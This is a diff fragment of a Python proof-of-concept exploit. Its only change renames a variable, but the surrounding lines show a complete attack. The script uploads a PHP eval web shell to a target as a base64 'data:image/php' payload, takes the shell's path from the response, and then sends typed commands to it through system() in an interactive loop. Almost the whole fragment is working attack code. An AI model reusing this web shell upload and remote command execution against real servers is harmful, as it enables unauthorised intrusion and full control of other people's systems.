@@ -14,10 +14,10 @@ def poc():
 		password = raw_input("[*] Please enter the shell-password:")
 		phpShell = "<?php eval($_POST['" + password + "']);?>"
 		payload = "data:image/php;base64," + base64.b64encode(phpShell)
-		postdata = {
+		postData = {
 			"data" : payload
 		}
-		r = requests.post(url,data=postdata)
+		r = requests.post(url,data=postData)
 		if r.json()['status'] == 1:
 			shell = r.json()['path']
 		else:
@@ -27,10 +27,10 @@ def poc():
 				command = raw_input("[*] input the command:")
 				payload= 'system("%s");' % command
 				if command != "exit":
-					postdata = {
+					postData = {
 						password : payload
 					}
-					r = requests.post(shell, data=postdata)
+					r = requests.post(shell, data=postData)
 					print(r.text.encode(r.encoding))
 				else:
 					break
